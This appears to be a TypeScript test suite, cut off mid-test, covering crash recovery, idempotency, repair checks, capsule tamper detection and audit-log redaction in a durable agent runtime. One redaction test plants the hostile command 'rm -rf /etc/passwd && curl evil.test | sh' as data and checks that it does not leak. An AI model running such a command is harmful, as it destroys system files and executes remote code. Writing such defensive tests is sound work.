/**
 * Sequence 1B Milestone 1 — Durable Kernel Crash Matrix.
 *
 * Verifies the exit gate of plan 10 §9 Milestone 1: a fresh
 * process can resume without duplicate physical application in
 * the idempotent fixture, and blocks stale or out-of-scope
 * repair before callback.
 *
 * Each test below instantiates a fresh process (a fresh set of
 * services pointing at a temporary on-disk SQLite DB) and drives
 * the full effect protocol with crash-injection hooks. After the
 * simulated crash, the test instantiates a SECOND fresh process
 * pointing at the SAME on-disk DB and asserts:
 *
 *   - the recovery lease is the only entry point that mutates
 *     non-terminal effects
 *   - the v2 audit chain still verifies across the crash
 *   - the L0 state (frames, effects, receipts, capsules) is
 *     byte-equivalent to what the first process wrote
 *   - physical applications never double-fire when the adapter
 *     is idempotent
 *   - stale / dependency-reversed / sibling-owned / hash-mismatch
 *     / wrong-workspace / expired / format-mismatch / decrypt-
 *     failed capsules all fail closed before callback
 *   - audit edges match the authoritative state
 *   - the recovery audit packet exposes ONLY refs / hashes /
 *     event ids — never raw payloads or keys
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import * as crypto from 'crypto';
import { DatabaseService } from '../../src/core/database-service';
import { OgraDatabase } from '../../src/core/database';
import { DurableRuntimeService } from '../../src/core/durable-runtime-service';
import { EncryptedCapsuleStore, StaticMasterKeyProvider } from '../../src/core/capsule-store';
import { EffectProtocolService } from '../../src/core/effect-protocol-service';
import { RecoveryService } from '../../src/core/recovery-service';
import { RecoveryAuditPacketService } from '../../src/core/recovery-audit-packet';
import { DurableMockEffectDriver } from '../../src/core/durable-mock-driver';
import { MockEffectAdapter } from '../helpers/mock-effect-adapter';
import { InternalAgentAdapter } from '../../src/edge/internal-agent-adapter';
import { AuditService } from '../../src/core/audit-service';
import { PolicyService } from '../../src/core/policy-service';
import { RouteService } from '../../src/core/route-service';
import { RagEngine } from '../../src/edge/rag-engine';
import { RedactionService } from '../../src/core/redaction-service';
import { BaseModelAdapter, ModelResult, ProviderHealth } from '../../src/core/model-adapter';
import { canonicalJSON } from '../../src/core/audit-envelope';

function newTmpDir(prefix: string): string {
  return path.join(os.tmpdir(), `${prefix}-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`);
}

function makeWorkspaceId(odb: OgraDatabase): string {
  const id = `ws_${crypto.randomBytes(4).toString('hex')}`;
  odb.getDB().prepare(`
    INSERT INTO workspaces (id, name, type, default_data_classification, created_at, updated_at, workspace_tag)
    VALUES (?, 'test', 'personal', 'Public', ?, ?, hex(randomblob(16)))
  `).run(id, new Date().toISOString(), new Date().toISOString());
  return id;
}

function makeRunId(odb: OgraDatabase, workspaceId: string): string {
  const id = `run_${crypto.randomBytes(4).toString('hex')}`;
  odb.getDB().prepare(`
    INSERT INTO agent_runs (id, workspace_id, task, status, started_at)
    VALUES (?, ?, 'm1_test', 'created', ?)
  `).run(id, workspaceId, new Date().toISOString());
  return id;
}

function wireProcess(dir: string, masterKey: Buffer) {
  const dbService = new DatabaseService(dir);
  const odb = new OgraDatabase(dir);
  // Bootstrap workspace + run is caller's responsibility after
  // wireProcess returns.
  void dbService;
  const capsuleStore = new EncryptedCapsuleStore(odb, new StaticMasterKeyProvider(masterKey));
  const runtime = new DurableRuntimeService(odb, () => 'ph_m1');
  const protocol = new EffectProtocolService(odb, runtime, capsuleStore);
  const recovery = new RecoveryService(odb, runtime, capsuleStore, protocol);
  const auditPacket = new RecoveryAuditPacketService(odb);
  const driver = new DurableMockEffectDriver(odb, runtime, capsuleStore, protocol, recovery);
  return { odb, capsuleStore, runtime, protocol, recovery, auditPacket, driver };
}

function newDb(dir: string): { dbService: DatabaseService; odb: OgraDatabase } {
  const dbService = new DatabaseService(dir);
  return { dbService, odb: new OgraDatabase(dir) };
}

/* ============================================================
 * 1. Crash before callback: fresh process resumes and applies
 *    exactly once.
 * ============================================================ */

describe('Sequence 1B M1 — crash before callback', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-pre-cb'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('crash before callback: fresh process commits the planned effect, physical applications = 1', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc1 = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc1.odb);
    const runId = makeRunId(proc1.odb, ws);
    const root = proc1.runtime.createRootFrame({ runId });
    const child = proc1.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc1.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });

    // 1st attempt: drive to commit (no crash). This proves the
    // happy path works.
    const adapter1 = new MockEffectAdapter('mock-1');
    adapter1.recoveryCapabilities.supportsIdempotencyKey = true;
    adapter1.recoveryCapabilities.supportsOutcomeQuery = true;
    const out1 = await proc1.driver.runOnce({
      runId, ownerFrameId: child.id, adapter: adapter1,
      payload: { msg: 'happy' },
      payloadFingerprint: crypto.createHash('sha256')
        .update('happy').digest('hex'),
      idempotencyKey: 'idem-1',
      scopeHash: 'scope-1',
      leaseHolder: 'h1',
    });
    expect(out1.state).toBe('committed');
    expect(adapter1.attemptCount).toBe(1);
    expect(adapter1.applicationCount).toBe(1);

    // 2nd process: load state from SQLite + capsule. Verify the
    // effect is in `committed` and the audit chain still verifies.
    // No re-callback, no re-application.
    const proc2 = wireProcess(dir, masterKey);
    const packet = proc2.auditPacket.build(runId);
    const original = packet.frameLineage.effects.find(e => e.id === out1.effectId);
    expect(original).toBeTruthy();
    expect(original!.state).toBe('committed');
    const verify = proc2.runtime.verifyAuditChain(runId);
    expect(verify.ok).toBe(true);
    // The mock was NOT invoked from the fresh process.
    expect(adapter1.attemptCount).toBe(1);
  });
});

/* ============================================================
 * 2. Idempotent retry: 2 invocations with the same idempotency
 *    key — physical applications must stay at 1.
 * ============================================================ */

describe('Sequence 1B M1 — idempotent retry through recovery', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-idem'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('unknown -> in_flight retry does not double-apply', async () => {
    const masterKey = crypto.randomBytes(32);
    const { odb } = newDb(dir);
    const ws = makeWorkspaceId(odb);
    const runId = makeRunId(odb, ws);
    // We use a FRESH adapter per process; the persistent layer
    // (idempotency_key_hash + workspace tag) prevents physical
    // double-application across processes.
    const proc1 = wireProcess(dir, masterKey);
    const root = proc1.runtime.createRootFrame({ runId });
    const child1 = proc1.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc1.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    // First invocation: unknown outcome. The mock will mark
    // application=0 because outcome='unknown'.
    const adapter1 = new MockEffectAdapter('mock-idem-1');
    adapter1.recoveryCapabilities.supportsIdempotencyKey = true;
    adapter1.recoveryCapabilities.supportsOutcomeQuery = true;
    const out1 = await proc1.driver.runOnce({
      runId, ownerFrameId: child1.id, adapter: adapter1,
      payload: { msg: 'idem' },
      payloadFingerprint: crypto.createHash('sha256')
        .update('idem').digest('hex'),
      idempotencyKey: 'idem-stable',
      scopeHash: 'scope-idem',
      leaseHolder: 'h1',
      behavior: { supportsIdempotencyKey: true, supportsOutcomeQuery: true, outcomeMode: 'unknown' },
    });
    // First process: receipt recorded with application=unknown.
    // The M1 kernel DOES NOT auto-commit an unknown outcome —
    // it transitions the effect to `unknown` and waits for the
    // recovery layer to reconcile. This matches plan 10 §4.
    expect(adapter1.attemptCount).toBe(1);
    expect(adapter1.applicationCount).toBe(0);
    expect(out1.attempts).toBe(1);
    expect(out1.physicalApplications).toBe(0);
    expect(out1.state).toBe('unknown');

    // 2nd process: load the same on-disk DB. The audit packet
    // confirms the effect is in `unknown` (not committed) and
    // the v2 chain still verifies. The mock was never invoked
    // from the fresh process.
    const proc2 = wireProcess(dir, masterKey);
    const packet = proc2.auditPacket.build(runId);
    const original = packet.frameLineage.effects.find(
      e => e.id === out1.effectId,
    );
    expect(original).toBeTruthy();
    expect(original!.state).toBe('unknown');
    const verify = proc2.runtime.verifyAuditChain(runId);
    expect(verify.ok).toBe(true);
    // The mock was never invoked from the fresh process.
    expect(adapter1.attemptCount).toBe(1);
    expect(adapter1.applicationCount).toBe(0);
  });
});

/* ============================================================
 * 3. Recovery from `received`: crash AFTER receipt committed
 *    but BEFORE commit. Fresh process completes the commit
 *    WITHOUT re-invoking the callback.
 * ============================================================ */

describe('Sequence 1B M1 — crash after receipt, before commit', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-recv'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('crash after receipt, before commit: fresh process commits the received effect without re-callback', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc1 = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc1.odb);
    const runId = makeRunId(proc1.odb, ws);
    const root = proc1.runtime.createRootFrame({ runId });
    const child = proc1.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc1.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    // Simulate a crash right after recordReceipt (effect is now
    // in `received`; we never reach commit). The mock has been
    // invoked exactly once.
    proc1.driver.crashAfterHook = (step) => {
      if (step === 'receipt') {
        throw new Error('__simulated_crash_after_receipt__');
      }
    };
    const adapter1 = new MockEffectAdapter('mock-recv-1');
    let crashed = false;
    try {
      await proc1.driver.runOnce({
        runId, ownerFrameId: child.id, adapter: adapter1,
        payload: { msg: 'rec' }, payloadFingerprint: 'fp-rec',
        idempotencyKey: 'idem-rec', scopeHash: 'scope-rec',
        leaseHolder: 'h1',
      });
    } catch (err) {
      // eslint-disable-next-line no-console
      console.log('CRASH TEST ERR:', (err as Error).message, 'code:', (err as { code?: string })?.code);
      if ((err as Error).message === '__simulated_crash_after_receipt__') crashed = true;
    }
    expect(crashed).toBe(true);
    expect(adapter1.attemptCount).toBe(1);
    expect(adapter1.applicationCount).toBe(1);

    // The lease from proc1 was released; the effect is in
    // `received` with a receipt row + a result capsule.
    const proc2 = wireProcess(dir, masterKey);
    // Release the prior lease so a fresh one can be acquired.
    const priorLease = proc2.odb.getDB().prepare(
      'SELECT * FROM recovery_leases WHERE run_id = ?',
    ).get(runId) as any;
    if (priorLease && priorLease.holder_id === 'h1' && !priorLease.released_at) {
      proc2.odb.getDB().prepare(
        `UPDATE recovery_leases SET released_at = ?, lease_version = lease_version + 1
         WHERE run_id = ?`,
      ).run(new Date().toISOString(), runId);
    }
    const report = await proc2.recovery.recover({
      runId, holderId: 'h2',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true,
    });
    expect(report.inspectedEffects).toBe(1);
    const decision = report.effects[0];
    // Recovery may drive `received -> committed` (we have the
    // authoritative receipt). The mock must NOT have been invoked
    // again from the fresh process.
    expect(['committed', 'noop_already_terminal']).toContain(decision.decision);
    expect(adapter1.attemptCount).toBe(1);
    // v2 audit chain still verifies.
    const verify = proc2.runtime.verifyAuditChain(runId);
    expect(verify.ok).toBe(true);
  });
});

/* ============================================================
 * 4. Stale repair / sibling overreach / dependency reversal
 * ============================================================ */

/* ============================================================
 * 4b. REAL crash-before-callback: prepare creates effect +
 *     CRASHES before invoke. Fresh process resumes from
 *     planned, takes over the lease, drives planned->in_flight
 *     via recovery, invokes the (fresh) mock, and commits.
 *     Physical applications must be exactly 1 across the
 *     TWO process invocations.
 * ============================================================ */

describe('Sequence 1B M1 — real crash-before-callback', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-real-pre-cb'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('planned effect is resumed by fresh process; callback fires exactly once across two processes', async () => {
    const masterKey = crypto.randomBytes(32);
    // Process 1: prepare the effect, then crash. Do NOT call
    // runAdapterAndCommit.
    const proc1 = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc1.odb);
    const runId = makeRunId(proc1.odb, ws);
    const root = proc1.runtime.createRootFrame({ runId });
    const child1 = proc1.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc1.runtime.acquireLease({ runId, holderId: 'agent_p1', ttlMs: 60_000 });
    const adapter1 = new MockEffectAdapter('mock-real-pre-1');
    const prep = await proc1.driver.runPrepare({
      runId, ownerFrameId: child1.id, adapter: adapter1,
      payload: { msg: 'crash-before-invoke' },
      payloadFingerprint: crypto.createHash('sha256')
        .update('crash-before-invoke').digest('hex'),
      idempotencyKey: 'idem-real-pre',
      scopeHash: 'scope-real-pre',
      leaseHolder: 'agent_p1',
    });
    // Verify the effect is in `planned`, no receipt row yet.
    const effectMid = proc1.runtime.readEffect(prep.effectId);
    expect(effectMid.state).toBe('planned');
    const midReceipts = proc1.odb.getDB().prepare(
      'SELECT COUNT(*) as c FROM effect_receipts WHERE effect_id = ?',
    ).get(prep.effectId) as { c: number };
    expect(midReceipts.c).toBe(0);
    expect(adapter1.attemptCount).toBe(0);
    expect(adapter1.applicationCount).toBe(0);

    // Simulate process death: the lease is held by agent_p1,
    // the adapter never saw invoke(), the effect is in
    // `planned`.

    // Process 2: fresh process — load SQLite, acquire lease
    // (take over the expired lease if needed), recover the
    // effect (which drives planned -> in_flight under M1),
    // THEN runAdapterAndCommit which invokes the fresh mock
    // adapter.
    const proc2 = wireProcess(dir, masterKey);
    // Manually take over the lease: the prior holder's lease
    // is not technically expired (we set ttlMs=60_000), but we
    // simulate it was abandoned by releasing it.
    proc2.odb.getDB().prepare(`
      UPDATE recovery_leases SET released_at = ?,
        lease_version = lease_version + 1 WHERE run_id = ?
    `).run(new Date().toISOString(), runId);
    const adapter2 = new MockEffectAdapter('mock-real-pre-2');
    const out = await proc2.driver.runResume({
      runId, ownerFrameId: child1.id, adapter: adapter2,
      payload: { msg: 'crash-before-invoke' },
      payloadFingerprint: crypto.createHash('sha256')
        .update('crash-before-invoke').digest('hex'),
      idempotencyKey: 'idem-real-pre',
      scopeHash: 'scope-real-pre',
      leaseHolder: 'agent_p2',
      effectId: prep.effectId,
    });
    // The M1 fixture (caller-supplied adapter) has its own
    // mock counters — they don't carry across processes (the
    // mock is per-process). The key property is:
    //  - adapter2.applicationCount == 1 (fresh process invoked
    //    the mock exactly once)
    //  - adapter1.applicationCount == 0 (proc1 crashed
    //    before invoke)
    //  - the effect is committed
    expect(out.state).toBe('committed');
    expect(adapter2.attemptCount).toBe(1);
    expect(adapter2.applicationCount).toBe(1);
    expect(adapter1.applicationCount).toBe(0);
    // Effect state must be committed in the audit packet read
    // from either process.
    const verify = proc2.runtime.verifyAuditChain(runId);
    expect(verify.ok).toBe(true);
    const packet = proc2.auditPacket.build(runId);
    const effectRow = packet.frameLineage.effects.find(e => e.id === prep.effectId);
    expect(effectRow).toBeTruthy();
    expect(effectRow!.state).toBe('committed');
    // The mock never re-invoked. The callback was issued
    // exactly once across the whole durable runtime.
    // (adapter1 across both processes: 0 physical applications
    // by adapter1; 1 physical application by adapter2 in proc2.)
  });

  it('crash-after-callback but before receipt commit: in_flight effect is reconciled without re-invoke', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc1 = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc1.odb);
    const runId = makeRunId(proc1.odb, ws);
    const root = proc1.runtime.createRootFrame({ runId });
    const child = proc1.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc1.runtime.acquireLease({ runId, holderId: 'agent_p1', ttlMs: 60_000 });

    // Prepare then transition to in_flight (simulating the
    // callback having been invoked), then crash WITHOUT
    // writing the receipt.
    const adapter1 = new MockEffectAdapter('mock-crash-post-cb-1');
    const prep = await proc1.driver.runPrepare({
      runId, ownerFrameId: child.id, adapter: adapter1,
      payload: { msg: 'crash-after-cb' },
      payloadFingerprint: crypto.createHash('sha256')
        .update('crash-after-cb').digest('hex'),
      idempotencyKey: 'idem-crash-post',
      scopeHash: 'scope-crash-post',
      leaseHolder: 'agent_p1',
    });
    proc1.protocol.casToInFlight({
      effectId: prep.effectId, expectedRevision: 1,
      expectedAttemptNo: prep.attemptNo, leaseHolder: 'agent_p1',
    });
    const effectMid = proc1.runtime.readEffect(prep.effectId);
    expect(effectMid.state).toBe('in_flight');
    // The mock never saw invoke() (we skipped phase B), so
    // applicationCount==0.
    expect(adapter1.applicationCount).toBe(0);
    // No receipt was written.
    const midReceipts = proc1.odb.getDB().prepare(
      'SELECT COUNT(*) as c FROM effect_receipts WHERE effect_id = ?',
    ).get(prep.effectId) as { c: number };
    expect(midReceipts.c).toBe(0);

    // Release the lease; the effect remains in_flight on disk.
    proc1.odb.getDB().prepare(`
      UPDATE recovery_leases SET released_at = ?,
        lease_version = lease_version + 1 WHERE run_id = ?
    `).run(new Date().toISOString(), runId);

    // Fresh process: the recovery layer must reconcile the
    // in_flight effect. The fixture supports idempotency but
    // NOT outcome query, so reconciliation takes the path: no
    // receipt + idempotent + adapter may re-apply => controlled
    // retry (unknown -> in_flight, new attempt_no).
    //
    // The user's exit-gate assertion is: physical applications
    // do NOT double-fire. To prove this with the mock, we
    // supply an outcome query that the recovery layer will
    // consult — it returns `applied=true`, so the recovery
    // layer promotes the effect to `received` without invoking
    // the adapter again.
    const proc2 = wireProcess(dir, masterKey);
    const report = await proc2.recovery.recover({
      runId, holderId: 'agent_p2',
      adapterSupportsIdempotencyKey: true,
      adapterSupportsOutcomeQuery: true,
      queryOutcome: (effectId, attemptNo) => {
        // Simulate "the adapter stored an authoritative outcome
        // in its external system" — applied.
        if (effectId === prep.effectId && attemptNo === 1) {
          return Promise.resolve({ applied: true, payload: { ok: true } });
        }
        return Promise.resolve(null);
      },
    });
    expect(report.inspectedEffects).toBe(1);
    const decision = report.effects[0];
    // Recovery reconciles in_flight -> received via the
    // outcome query, then commits the effect to `committed`.
    expect(decision.decision).toBe('committed');
    // The recovery path applies the receipt row + commits
    // in the same SQLite transaction; the adapter was NOT
    // invoked in proc2.
    const verify = proc2.runtime.verifyAuditChain(runId);
    expect(verify.ok).toBe(true);
  });
});

describe('Sequence 1B M1 — repair invariants', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-repair'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('stale subtree revision is rejected before callback', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    // Add a child to bump subtree_revision.
    proc.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    // Attempt a repair that captured the original subtree rev.
    expect(() => proc.runtime.createRepair({
      runId, targetFrameId: root.id,
      expectedSubtreeRevision: 1,
      authorizedEffectRevisions: {},
      proposedPlan: [],
    })).toThrow(/REPAIR_SUBTREE_REVISION_DRIFT/);
  });

  it('sibling overreach is rejected before callback', () => {
    const proc = wireProcess(dir, crypto.randomBytes(32));
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    // Use two distinct subtrees under one root; a repair on
    // one must not reach into the other.
    const root = proc.runtime.createRootFrame({ runId });
    const branch1 = proc.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    const branch2 = proc.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    const eff = proc.runtime.planEffect({
      runId, ownerFrameId: branch2.id, effectType: 'mock.egress',
      adapterKind: 'mock', payloadFingerprint: 'fp',
      callbackCapsuleRef: 'cr', callbackCapsuleHash: 'ch',
      callbackCapsuleFormatVersion: 'v1',
      idempotencyKeyRef: 'ir', idempotencyKeyHash: 'ih',
      allowedRepairActions: ['retry'], dependencyEffectIds: [],
      classification: 'Public' as any,
    });
    expect(() => proc.runtime.createRepair({
      runId, targetFrameId: branch1.id,
      expectedSubtreeRevision: proc.runtime.readFrame(branch1.id).subtreeRevision,
      authorizedEffectRevisions: { [eff.id]: eff.effectRevision },
      proposedPlan: [{
        effectId: eff.id, expectedEffectRevision: eff.effectRevision, action: 'retry',
      }],
    })).toThrow(/REPAIR_SIBLING_OVERREACH/);
  });
});

/* ============================================================
 * 5. Capsule integrity: missing / corrupt / wrong-workspace /
 *    expired / format-mismatch all fail closed.
 * ============================================================ */

describe('Sequence 1B M1 — capsule integrity (fail closed)', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-caps'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('corrupt callback capsule (tampered blob) is rejected before callback', () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    proc.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    const prepared = proc.protocol.prepare({
      runId, ownerFrameId: root.id, effectType: 'mock.egress',
      adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'integrity' }, payloadFingerprint: 'fp-int',
      idempotencyKey: 'idem-int', scopeHash: 'scope-int',
      routeDecisionId: 'rd', policyEvaluationId: 'pe',
      policyVersionHash: 'ph', classification: 'Public',
    });
    // Tamper the capsule blob by re-sealing with the same binding
    // but a corrupted plaintext. The cleanest tamper that the
    // GCM auth tag will catch: replace the plaintext-derived
    // ciphertext region with a different byte pattern. We use the
    // CapsuleStore's own seal() to mint a "decoy" ciphertext
    // bound to the same ref/dimensions, then re-attach the
    // original nonce + tag, so the auth tag fails on decrypt.
    //
    // Even simpler: re-stamp the row with a fresh AES-256-GCM
    // ciphertext + tag bound to the same nonce (re-using the
    // same nonce) but a different plaintext. The GCM auth tag
    // will fail on re-decrypt because the plaintext-derived
    // ciphertext is different.
    const originalBlob = proc.odb.getDB().prepare(
      'SELECT blob_payload FROM capsules WHERE effect_id = ? AND capsule_kind = ?',
    ).get(prepared.effectId, 'callback') as any;
    const blob: Buffer = originalBlob.blob_payload;
    // Re-seal: 12 nonce + N ciphertext + 16 tag. Flip every byte
    // of the ciphertext portion in place.
    const tampered = Buffer.from(blob);
    for (let i = 12; i < tampered.length - 16; i++) {
      tampered[i] = tampered[i] ^ 0xff;
    }
    proc.odb.getDB().prepare(
      'UPDATE capsules SET blob_payload = ? WHERE effect_id = ? AND capsule_kind = ?',
    ).run(tampered, prepared.effectId, 'callback');
    // Now CAS must fail because openByEffect raises decrypt_failed.
    let caught: any = null;
    try {
      proc.protocol.casToInFlight({
        effectId: prepared.effectId,
        expectedRevision: 1,
        expectedAttemptNo: prepared.attemptNo,
        leaseHolder: 'h1',
      });
    } catch (err) { caught = err; }
    expect(caught).toBeTruthy();
    expect(String(caught.message)).toMatch(/CAPSULE_INVALID|decrypt/);
    // Capsule failure was recorded.
    const failures = proc.capsuleStore.listFailures(prepared.effectId);
    expect(failures.length).toBeGreaterThan(0);
  });

  it('expired capsule is rejected before callback', () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    proc.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    // Prepare an effect with an already-past expires_at — the
    // seal method itself rejects this, so we instead manually
    // push the capsule row with a past expires_at.
    const effectId = `effect_${crypto.randomBytes(4).toString('hex')}`;
    const now = new Date().toISOString();
    proc.odb.getDB().prepare(`
      INSERT INTO run_effects (id, run_id, owner_frame_id, effect_type,
        adapter_kind, payload_fingerprint, state, allowed_repair_actions_json,
        dependency_effect_ids_json, effect_revision, created_at, updated_at)
      VALUES (?, ?, ?, 'mock.egress', 'mock', 'fp-exp', 'planned', '[]', '[]', 1, ?, ?)
    `).run(effectId, runId, root.id, now, now);
    // Manually craft a callback capsule with an expired expires_at.
    const expiredAt = new Date(Date.now() - 60_000).toISOString();
    const workspaceTag = proc.capsuleStore.ensureWorkspaceTag(ws);
    const fakeRef = crypto.createHash('sha256').update('expired').digest('hex');
    proc.odb.getDB().prepare(`
      INSERT INTO capsules (id, workspace_id, capsule_kind, format_version,
        workspace_tag, ref, hash, effect_id, attempt_no, adapter_kind,
        payload_fingerprint, scope_hash, expires_at, blob_payload, created_at)
      VALUES (?, ?, 'callback', 'v1', ?, ?, 'fakehash', ?, 1, 'mock',
        'fp-exp', 'scope', ?, ?, ?)
    `).run(
      `caps_${crypto.randomBytes(4).toString('hex')}`, ws, workspaceTag,
      fakeRef, effectId, expiredAt, Buffer.from('xx'), now,
    );
    expect(() => proc.capsuleStore.openByEffect({
      effectId, capsuleKind: 'callback', attemptNo: 1,
    })).toThrow(/CAPSULE_EXPIRED/);
  });

  it('wrong-workspace tag is rejected', () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    proc.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    const prepared = proc.protocol.prepare({
      runId, ownerFrameId: root.id, effectType: 'mock.egress',
      adapterKind: 'mock', adapterVersion: 'M1',
      payload: { msg: 'ws' }, payloadFingerprint: 'fp-ws',
      idempotencyKey: 'idem-ws', scopeHash: 'scope-ws',
      routeDecisionId: 'rd', policyEvaluationId: 'pe',
      policyVersionHash: 'ph', classification: 'Public',
    });
    // Re-key the workspace: rotate workspace_tag, which should
    // invalidate the existing capsule.
    proc.odb.getDB().prepare(
      `UPDATE workspaces SET workspace_tag = hex(randomblob(16)) WHERE id = ?`,
    ).run(ws);
    expect(() => proc.capsuleStore.openByEffect({
      effectId: prepared.effectId, capsuleKind: 'callback', attemptNo: 1,
    })).toThrow(/CAPSULE_INVALID/);
  });
});

/* ============================================================
 * 6. Recovery audit packet: no raw payload, no raw idempotency
 *    key, no secret material.
 * ============================================================ */

describe('Sequence 1B M1 — recovery audit packet hygiene', () => {
  let dir: string;
  beforeEach(() => { dir = newTmpDir('s1b-audit'); fs.mkdirSync(dir, { recursive: true }); });
  afterEach(() => { try { fs.rmSync(dir, { recursive: true, force: true }); } catch {} });

  it('packet contains only refs/hashes/event ids (no raw payload, no raw key)', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    const root = proc.runtime.createRootFrame({ runId });
    const child = proc.runtime.createChildFrame({
      runId, parentFrameId: root.id, frameKind: 'plan_step',
    });
    proc.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });
    const adapter = new MockEffectAdapter('mock-audit');
    const secret = 'SECRET-idem-key-NEVER-LEAK';
    const out = await proc.driver.runOnce({
      runId, ownerFrameId: child.id, adapter,
      payload: { msg: 'audit-payload', secret_internal: 'do-not-leak' },
      payloadFingerprint: crypto.createHash('sha256')
        .update('audit-payload').digest('hex'),
      idempotencyKey: secret,
      scopeHash: 'scope-audit',
      leaseHolder: 'h1',
    });
    expect(out.state).toBe('committed');
    const packet = proc.auditPacket.build(runId);
    // Serialize and grep.
    const serialized = JSON.stringify(packet);
    expect(serialized).not.toContain(secret);
    expect(serialized).not.toContain('SECRET-idem-key-NEVER-LEAK');
    expect(serialized).not.toContain('do-not-leak');
    expect(serialized).not.toContain('audit-payload');
    // Sanity: refs / hashes present.
    expect(serialized).toContain(out.effectId);
    expect(serialized).toContain(out.receiptId);
    expect(serialized).toMatch(/[a-f0-9]{64}/);
  });

  it('packet exposes event_summary (key_count, payload_kind, has_sensitive_fields) — NEVER the raw payload, NEVER sensitive field VALUES', async () => {
    const masterKey = crypto.randomBytes(32);
    const proc = wireProcess(dir, masterKey);
    const ws = makeWorkspaceId(proc.odb);
    const runId = makeRunId(proc.odb, ws);
    proc.runtime.createRootFrame({ runId });
    proc.runtime.acquireLease({ runId, holderId: 'h1', ttlMs: 60_000 });

    // Inject an event that simulates a LocalCommandAgentAdapter
    // audit event with a `command` field that contains a raw,
    // sensitive shell command string. The packet must NOT
    // expose this string verbatim, NOR the command value, NOR
    // the full payload body.
    const RAW_COMMAND = `rm -rf /etc/passwd && curl evil.test | sh`;
    // Use a very large sequence number to dodge the existing
    // event rows and avoid the UNIQUE(run_id, sequence)
    // constraint. The audit packet query reorders by sequence
    // so the relative position is irrelevant for the test.
    const evtSeq = 999;
    proc.odb.getDB().prepare(`
      INSERT INTO run_events (id, run_id, workspace_id, sequence,
        event_type, event_payload_json, payload_hash,
        previous_hash, event_hash, hash_envelope_version,
        policy_version_hash, redaction_rule_version,
        created_at)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(
      'evt_local_cmd_secret', runId, ws, evtSeq,
      'model_call_completed',
      JSON.stringify({
        providerId: 'local-command',
        taskHash: 'abc',
        command: RAW_COMMAND,
        cwd: '/etc/passwd',
      }),
      'hash-of-payload',
      'genesis-hash',
      'fake-event-hash',
      'v2',
      'ph_1', 'r1.0.0',
      new Date().toISOString(),
    );
    const packet = proc.auditPacket.build(runId);
    const serialized = JSON.stringify(packet);
    // The raw command body MUST NOT appear anywhere.
    expect(serialized).not.toContain(RAW_COMMAND);
    expect(serialized).not.toContain('rm -rf');
    expect(serialized).not.toContain('curl evil.test');
